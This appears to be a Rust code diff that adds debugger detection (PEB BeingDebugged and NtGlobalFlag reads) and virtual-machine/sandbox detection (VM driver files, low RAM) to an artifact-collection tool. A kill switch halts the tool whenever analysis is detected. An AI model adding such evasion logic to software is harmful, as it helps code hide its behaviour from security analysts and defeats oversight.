@@ -197,7 +197,204 @@ pub fn behavioral_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
         Arc::new(PageProtectionTask),
         Arc::new(SingleStepDetectionTask),
         Arc::new(SpreadValidationTask),
+        Arc::new(EnvironmentalDiscoveryTask),
+        Arc::new(DebuggerDetectionTask),
     ]
+}
+
+struct DebuggerDetectionTask;
+
+#[async_trait]
+impl RecoveryTask for DebuggerDetectionTask {
+    fn label(&self) -> String {
+        "Behavioral: Debugger Detection".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::System
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let summary = collect_debugger_summary();
+        if summary.suspicious {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
+        let artifact = write_json_artifact(
+            ctx,
+            self.category(),
+            &self.label(),
+            "behavioral-debugger-detection.json",
+            &summary,
+        )
+        .await?;
+        Ok(vec![artifact])
+    }
+}
+
+#[derive(Serialize)]
+struct DebuggerSummary {
+    suspicious: bool,
+    checks: Vec<EnvironmentalCheck>,
+}
+
+fn collect_debugger_summary() -> DebuggerSummary {
+    let mut checks = Vec::new();
+    let mut suspicious = false;
+
+    // Check PEB BeingDebugged flag
+    let peb_debugged = is_peb_debugger_present();
+    if peb_debugged {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "PEB BeingDebugged".to_string(),
+        detected: peb_debugged,
+        details: None,
+    });
+
+    // Check for NtGlobalFlag
+    let nt_global_flag = is_nt_global_flag_set();
+    if nt_global_flag {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "NtGlobalFlag Debugger".to_string(),
+        detected: nt_global_flag,
+        details: None,
+    });
+
+    DebuggerSummary { suspicious, checks }
+}
+
+fn is_peb_debugger_present() -> bool {
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        let peb_debugged: u32;
+        std::arch::asm!(
+            "mov {tmp}, gs:[0x60]",
+            "movzx {out:e}, byte ptr [{tmp} + 2]",
+            tmp = out(reg) _,
+            out = out(reg) peb_debugged,
+        );
+        (peb_debugged & 0xFF) != 0
+    }
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        false
+    }
+}
+
+fn is_nt_global_flag_set() -> bool {
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        let nt_global_flag: u32;
+        std::arch::asm!(
+            "mov {tmp}, gs:[0x60]",
+            "mov {out:e}, dword ptr [{tmp} + 0xBC]",
+            tmp = out(reg) _,
+            out = out(reg) nt_global_flag,
+        );
+        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+        (nt_global_flag & 0x70) != 0
+    }
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        false
+    }
+}
+
+struct EnvironmentalDiscoveryTask;
+
+#[async_trait]
+impl RecoveryTask for EnvironmentalDiscoveryTask {
+    fn label(&self) -> String {
+        "Behavioral: Environmental Discovery".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::System
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let summary = collect_environmental_summary();
+        if summary.suspicious {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
+        let artifact = write_json_artifact(
+            ctx,
+            self.category(),
+            &self.label(),
+            "behavioral-environmental-discovery.json",
+            &summary,
+        )
+        .await?;
+        Ok(vec![artifact])
+    }
+}
+
+#[derive(Serialize)]
+struct EnvironmentalSummary {
+    suspicious: bool,
+    checks: Vec<EnvironmentalCheck>,
+}
+
+#[derive(Serialize)]
+struct EnvironmentalCheck {
+    name: String,
+    detected: bool,
+    details: Option<String>,
+}
+
+fn collect_environmental_summary() -> EnvironmentalSummary {
+    let mut checks = Vec::new();
+    let mut suspicious = false;
+
+    // Check for common VM files
+    let vm_files = [
+        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
+        "C:\\windows\\System32\\Drivers\\vboxguest.sys",
+        "C:\\windows\\System32\\Drivers\\vmhgfs.sys",
+    ];
+
+    for file in vm_files {
+        let detected = std::path::Path::new(file).exists();
+        if detected {
+            suspicious = true;
+        }
+        checks.push(EnvironmentalCheck {
+            name: format!("File Presence: {}", file),
+            detected,
+            details: None,
+        });
+    }
+
+    // Check for RAM size (Sandboxes often have < 4GB)
+    if let Ok(mem) = get_total_ram_gb() {
+        let low_ram = mem < 4;
+        if low_ram {
+            suspicious = true;
+        }
+        checks.push(EnvironmentalCheck {
+            name: "Low RAM Check".to_string(),
+            detected: low_ram,
+            details: Some(format!("{} GB", mem)),
+        });
+    }
+
+    EnvironmentalSummary { suspicious, checks }
+}
+
+fn get_total_ram_gb() -> Result<u64, String> {
+    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
+    unsafe {
+        let mut mem_status = MEMORYSTATUSEX::default();
+        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
+        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
+            Ok(mem_status.ullTotalPhys / (1024 * 1024 * 1024))
+        } else {
+            Err("failed to get memory status".to_string())
+        }
+    }
 }
 
 struct TimingDistortionTask;
